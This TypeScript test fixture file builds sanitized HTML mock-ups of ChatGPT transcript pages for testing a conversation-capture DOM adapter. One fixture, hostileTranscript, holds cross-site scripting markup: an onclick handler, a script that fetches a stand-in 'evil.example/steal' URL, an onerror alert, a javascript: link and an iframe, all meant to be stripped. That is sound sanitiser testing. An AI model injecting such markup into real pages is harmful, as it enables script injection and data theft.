/**
 * Sanitized DOM fixtures.
 *
 * These are hand-written approximations of the ChatGPT transcript structure.
 * They contain no real employee content, no cookies and no tokens, and they are
 * the only thing the DOM adapter tests run against — no live account is ever
 * automated.
 */

export interface FixtureOptions {
  workspaceLabel?: string | null;
  workspaceId?: string | null;
  personal?: boolean;
  enterpriseBadge?: boolean;
}

function workspaceChrome(options: FixtureOptions): string {
  const parts: string[] = [];
  if (options.workspaceLabel !== null) {
    const label = options.workspaceLabel ?? "TechSara's Workspace";
    // Sanitized copy of the live sidebar structure (verified 2026-08): the
    // name is a `div.truncate` nested in the profile button, and a collapsed
    // icon-only button with the same testid precedes it in the DOM. The
    // adapter must reach the second button's label, so the empty twin stays
    // in the fixture as a regression trap.
    parts.push(
      '<div data-testid="accounts-profile-button"></div>' +
        `<div data-testid="accounts-profile-button" aria-label="${label} Enterprise, open profile menu">` +
        '<div class="flex min-w-0 items-center gap-2"><div class="min-w-0">' +
        '<div class="flex min-w-0 grow items-center gap-2.5">' +
        `<div class="truncate">${label}</div>` +
        '</div></div></div></div>',
    );
  }
  if (options.workspaceId) {
    parts.push(`<div data-workspace-id="${options.workspaceId}"></div>`);
  }
  if (options.personal) {
    parts.push('<div data-workspace-kind="personal"></div>');
  }
  if (options.enterpriseBadge) {
    parts.push('<span data-testid="enterprise-badge">Enterprise</span>');
  }
  return `<nav>${parts.join('')}</nav>`;
}

function turn(
  id: string,
  role: 'user' | 'assistant' | 'tool',
  inner: string,
  attrs = '',
): string {
  return `
    <article data-testid="conversation-turn-${id}" data-message-id="msg-${id}"
             data-message-author-role="${role}" ${attrs}>
      ${inner}
    </article>`;
}

/** A short conversation with a user turn and a rich assistant answer. */
export function basicTranscript(options: FixtureOptions = {}): string {
  return `
    ${workspaceChrome(options)}
    <main>
      <div data-testid="conversation-scroll-container">
        ${turn('1', 'user', '<div class="whitespace-pre-wrap">What is our expense policy?</div>')}
        ${turn(
          '2',
          'assistant',
          `<div class="markdown">
             <p>The policy has three rules.</p>
             <ol><li>Submit within 30 days</li><li>Attach a receipt</li><li>Use the company card</li></ol>
             <h3>Limits</h3>
             <table>
               <thead><tr><th>Category</th><th>Limit</th></tr></thead>
               <tbody><tr><td>Meals</td><td>45</td></tr><tr><td>Taxi</td><td>80</td></tr></tbody>
             </table>
             <pre data-language="python"><code class="language-python">print("expense report")</code></pre>
             <blockquote>Ask finance if unsure.</blockquote>
             <p>See <a href="https://intranet.example.com/policy" rel="noopener" target="_blank" data-citation="c1">the policy</a>.</p>
           </div>`,
          'data-message-model-slug="gpt-4o"',
        )}
      </div>
      <form><textarea data-testid="prompt-textarea">DRAFT: this must never be captured</textarea></form>
    </main>`;
}

/** An assistant message still streaming. */
export function streamingTranscript(partialText = 'The first half of the ans'): string {
  return `
    ${workspaceChrome({})}
    <main>
      <div data-testid="conversation-scroll-container">
        ${turn('1', 'user', '<div class="whitespace-pre-wrap">Explain the policy</div>')}
        ${turn(
          '2',
          'assistant',
          `<div class="markdown"><p>${partialText}</p></div><div class="result-streaming"></div>`,
          'data-is-streaming="true"',
        )}
      </div>
    </main>`;
}

/** The same conversation, now finished streaming with the full answer. */
export function completedTranscript(fullText = 'The first half of the answer, and the rest.'): string {
  return `
    ${workspaceChrome({})}
    <main>
      <div data-testid="conversation-scroll-container">
        ${turn('1', 'user', '<div class="whitespace-pre-wrap">Explain the policy</div>')}
        ${turn('2', 'assistant', `<div class="markdown"><p>${fullText}</p></div>`)}
      </div>
    </main>`;
}

/** A regenerated answer showing the "2 / 3" branch counter. */
export function branchedTranscript(): string {
  return `
    ${workspaceChrome({})}
    <main>
      <div data-testid="conversation-scroll-container">
        ${turn('1', 'user', '<div class="whitespace-pre-wrap">Give me a summary</div>')}
        ${turn(
          '2',
          'assistant',
          `<div class="tabular-nums">2 / 3</div>
           <div class="markdown"><p>Second variant of the answer.</p></div>`,
        )}
      </div>
    </main>`;
}

/** A conversation with an attached file and a generated image. */
export function attachmentTranscript(): string {
  return `
    ${workspaceChrome({})}
    <main>
      <div data-testid="conversation-scroll-container">
        ${turn(
          '1',
          'user',
          `<div data-testid="file-attachment" data-filename="q3-report.pdf"
                data-mime-type="application/pdf" data-file-size="24576" data-file-id="file-123"></div>
           <div class="whitespace-pre-wrap">Summarise the attached report</div>`,
        )}
        ${turn(
          '2',
          'assistant',
          `<div class="markdown"><p>Here is a chart.</p></div>
           <img data-testid="generated-image" alt="Generated revenue chart" data-file-id="file-456" />`,
        )}
      </div>
    </main>`;
}

/** A tool/function message rendered inline. */
export function toolTranscript(): string {
  return `
    ${workspaceChrome({})}
    <main>
      <div data-testid="conversation-scroll-container">
        ${turn('1', 'user', '<div class="whitespace-pre-wrap">Search the wiki</div>')}
        ${turn(
          '2',
          'tool',
          '<div class="markdown"><pre><code>{"results": 3}</code></pre></div>',
        )}
        ${turn('3', 'assistant', '<div class="markdown"><p>I found three pages.</p></div>')}
      </div>
    </main>`;
}

/** A transcript with hostile markup that must never survive sanitisation. */
export function hostileTranscript(): string {
  return `
    ${workspaceChrome({})}
    <main>
      <div data-testid="conversation-scroll-container">
        ${turn(
          '1',
          'assistant',
          `<div class="markdown">
             <p onclick="steal()">Innocent looking text</p>
             <script>fetch('https://evil.example/steal')</script>
             <img src="x" onerror="alert(1)" />
             <a href="javascript:alert(1)">click me</a>
             <iframe src="https://evil.example"></iframe>
           </div>`,
        )}
      </div>
    </main>`;
}

/** A long transcript used by the backfill tests. */
export function longTranscript(count: number): string {
  const turns: string[] = [];
  for (let index = 0; index < count; index += 1) {
    const role = index % 2 === 0 ? 'user' : 'assistant';
    const body =
      role === 'user'
        ? `<div class="whitespace-pre-wrap">Question number ${index}</div>`
        : `<div class="markdown"><p>Answer number ${index}</p></div>`;
    turns.push(turn(String(index), role, body));
  }
  return `
    ${workspaceChrome({})}
    <main><div data-testid="conversation-scroll-container">${turns.join('')}</div></main>`;
}

export const CONVERSATION_URL = 'https://chatgpt.com/c/11111111-2222-3333-4444-555555555555';
export const CONVERSATION_ID = '11111111-2222-3333-4444-555555555555';
export const OTHER_CONVERSATION_URL = 'https://chatgpt.com/c/99999999-8888-7777-6666-555555555555';
